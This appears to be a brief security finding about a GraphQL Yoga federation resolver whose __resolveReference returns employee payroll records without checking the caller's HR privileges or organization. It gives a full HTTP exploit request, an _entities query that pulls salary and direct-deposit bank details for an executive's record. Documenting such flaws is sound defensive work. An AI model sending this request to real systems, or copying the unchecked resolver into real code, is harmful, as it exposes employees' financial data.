diagnosis: The GraphQL Yoga federated entity resolver __resolveReference fetches EmployeePayroll solely by the federated reference.id without validating that the authenticated context.user has HR payroll privileges or belongs to the same corporate organization as the targeted employee. Any authenticated user sending an _entities federation query to the subgraph or gateway can inspect arbitrary employee salary figures and bank account details.
exploit_request:
POST /graphql HTTP/1.1
Host: payroll-subgraph.internal:4001
Content-Type: application/json
Authorization: Bearer <attacker_jwt>

{"query": "query { _entities(representations: [{ __typename: \"EmployeePayroll\", id: \"pay_exec_883910\" }]) { ... on EmployeePayroll { employeeId baseSalary directDepositRouting directDepositAccount taxWithholdings } } }"}
